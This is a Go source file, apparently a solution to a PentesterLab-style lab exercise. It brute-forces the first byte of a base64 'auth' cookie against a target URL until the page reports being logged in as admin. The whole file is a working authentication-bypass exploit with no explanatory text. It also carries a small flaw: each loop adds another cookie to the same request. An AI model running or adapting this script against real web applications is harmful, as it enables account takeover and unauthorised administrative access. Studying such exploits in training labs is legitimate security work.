package main

import (
	"encoding/base64"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"strconv"
	"strings"
)

// echo '4SvNqn2PILoomzdA2WZaRVSCT3Sr3YNJ' | base64 -d | hexdump -C
func CookieStringToCookieHex(cookieString string) []byte {
	base64CookieString, err := url.QueryUnescape(cookieString)
	if err != nil {
		log.Fatal(err)
	}
	hexCookie, err := base64.StdEncoding.DecodeString(base64CookieString)

	if err != nil {
		log.Fatal(err)
	}
	return hexCookie
}

func TamperFirstByte(bytes []byte, b byte) []byte {
	if len(bytes) > 0 {
		bytes[0] = b
		return bytes
	}
	return nil
}

func HexCookieToCookieString(cookieHex []byte) string {
	rawCookieString := base64.StdEncoding.EncodeToString(cookieHex)
	return url.QueryEscape(rawCookieString)
}

func main() {
	const URL string = "http://ptl-805ef6b1-07f95605.libcurl.so/index.php"

	const cookieString = "gfe4frEfBGb4KbQFTXrOO3eU%2FkiAEAAy"

	req, err := http.NewRequest("GET", URL, nil)
	if err != nil {
		log.Fatal(err)
	}

	hexCookie := CookieStringToCookieHex(cookieString)

	for i := 0x00; i < 0xff; i++ {

		newCookieHex := TamperFirstByte(hexCookie, byte(i))

		newCookieString := HexCookieToCookieString(newCookieHex)

		fmt.Printf("Trying %02x...%v \n", i, newCookieString)

		req.AddCookie(&http.Cookie{Name: "auth", Value: newCookieString})

		client := &http.Client{}

		resp, err := client.Do(req)

		if err != nil {
			log.Fatal(err)
		}

		defer resp.Body.Close()

		if resp.StatusCode != 200 {
			err = errors.New(URL + "\nresp.StatusCode: " + strconv.Itoa(resp.StatusCode))
			return
		}

		b, err := ioutil.ReadAll(resp.Body)

		if err != nil {
			log.Fatal(err)
		}

		if strings.Contains(string(b), "You are currently logged in as admin!") {
			fmt.Println(string(b))
			break
		}
	}
}
